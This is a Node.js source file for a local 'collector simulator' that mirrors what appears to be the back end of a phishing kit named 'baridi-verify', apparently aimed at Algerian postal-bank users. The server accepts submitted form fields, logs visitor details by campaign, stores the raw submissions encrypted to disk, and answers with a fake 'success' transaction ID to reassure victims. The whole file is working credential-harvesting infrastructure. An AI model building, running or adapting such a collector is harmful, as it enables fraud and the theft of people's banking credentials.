#!/usr/bin/env node
/**
 * FEDJAJ collector simulator (local).
 *
 * Replicates the production Cloudflare Worker edge function behavior:
 *  - POST /beacon          -> logs beacon telemetry (datasets/beacons.jsonl)
 *  - POST /submit          -> encrypts raw submission, logs metadata (datasets/metadata.jsonl), returns ghost response
 *  - GET  /health          -> health check
 *
 * Raw payloads are AES-256-GCM encrypted to disk (the "store everything" / Option C behavior).
 * Metadata is plaintext structural only.
 *
 * Env:
 *   COLLECTOR_KEY  - encryption key (use env var in production; local default below)
 *   COLLECTOR_PORT - server port (default 8765)
 *   DATASET_DIR    - where datasets/ lives (default ./datasets)
 *
 * Usage: node infra/collector-sim.js
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { URL } = require('url');

const KEY = process.env.COLLECTOR_KEY || 'local-dev-key-do-not-use-in-prod'; // SEE NOTE BELOW
const PORT = parseInt(process.env.COLLECTOR_PORT || '8765', 10);
const DATASET_DIR = process.env.DATASET_DIR || path.join(__dirname, '..', 'datasets');

// NOTE: In production (Cloudflare Worker), the key comes from CF_RAW_KEY stored in your env-var vault.
// Never commit a real key. Local testing uses the placeholder above.

const RAW_DIR = path.join(DATASET_DIR, 'raw', 'submissions');
const BEACONS_FILE = path.join(DATASET_DIR, 'beacons.jsonl');
const META_FILE = path.join(DATASET_DIR, 'metadata.jsonl');

function ensureDirs() {
  [DATASET_DIR, RAW_DIR].forEach(d => { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); });
}

function loadLines(file) {
  if (!fs.existsSync(file)) return [];
  return fs.readFileSync(file, 'utf8').trim().split('\n').filter(Boolean);
}

function appendLines(file, lines) {
  ensureDirs();
  const tail = lines.map(l => l + '\n').join('');
  fs.appendFileSync(file, tail);
}

// AES-256-GCM encrypt (produces JSON: {iv, tag, data} all base64)
function encrypt(plaintext, key) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(key, 'utf8'), iv);
  const ct = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return JSON.stringify({ iv: iv.toString('base64'), tag: tag.toString('base64'), data: ct.toString('base64') });
}

function ghostTx() {
  const hex = 'BMB-' + crypto.randomBytes(3).toString('hex').toUpperCase();
  return { status: 'success', tx: hex };
}

const server = http.createServer(async (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Access-Control-Allow-Origin', '*');

  const url = new URL(req.url, 'http://localhost');
  const method = req.method;

  if (method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  if (method === 'GET' && url.pathname === '/health') {
    res.writeHead(200);
    res.end(JSON.stringify({ status: 'running', kit: 'baridi-verify', version: '0.1.0', mode: 'c' }));
    return;
  }

  if (method === 'POST' && (url.pathname === '/beacon' || url.pathname === '/submit')) {
    let body = '';
    for await (const chunk of req) { body += chunk; }

    // Beacon embedded as query param on /submit (beacon.js does this when collector is /submit)
    const beaconParam = url.searchParams.get('__fdj_beacon');
    let beacon = null;
    if (beaconParam) {
      try {
        beacon = JSON.parse(decodeURIComponent(beaconParam));
        beacon.injected_via = 'submit_query_param';
      } catch (e) { beacon = null; }
    }

    if (url.pathname === '/beacon' || beacon) {
      const payload = beacon || JSON.parse(body || '{}');
      payload.received_at = Date.now();
      appendLines(BEACONS_FILE, [JSON.stringify(payload)]);
      res.writeHead(200);
      res.end(JSON.stringify(ghostTx()));
      return;
    }

    // Real submission: encrypt raw, log metadata
    let data;
    try { data = JSON.parse(body); } catch (e) {
      res.writeHead(400); res.end(JSON.stringify({ error: 'invalid json' })); return;
    }

    const id = crypto.randomBytes(8).toString('hex');
    const metadata = {
      id, received_at: Date.now(),
      kit: data.kit || 'unknown', kit_hash: data.kit_hash || 'unknown',
      campaign_id: data.campaign_id || 'unknown', url: data.url || '',
      referrer: data.referrer || '', ua: data.ua || '', screen: data.screen || '',
      tz: data.tz || '', geo_hint: data.geo_hint || 'DZ',
      event: data.event || 'form_submit',
      fields: Object.keys(data).filter(k => !['kit','kit_hash','campaign_id','url','referrer','ua','screen','tz','ts','geo_hint','event','__fdj_beacon'].includes(k)),
      raw_encrypted: true,
      raw_path: 'datasets/raw/submissions/' + id + '.enc'
    };
    appendLines(META_FILE, [JSON.stringify(metadata)]);

    const enc = encrypt(JSON.stringify(data), KEY);
    ensureDirs();
    fs.writeFileSync(path.join(RAW_DIR, id + '.enc'), enc);

    res.writeHead(200);
    res.end(JSON.stringify(ghostTx()));
    return;
  }

  res.writeHead(404);
  res.end(JSON.stringify({ error: 'not found' }));
});

server.listen(PORT, () => {
  console.log('FEDJAJ collector sim running on port', PORT);
  console.log('datasets:', DATASET_DIR);
  console.log('  /beacon  -> datasets/beacons.jsonl');
  console.log('  /submit  -> datasets/raw/<id>.enc (encrypted) + datasets/metadata.jsonl');
  console.log('  GET /health -> status');
});
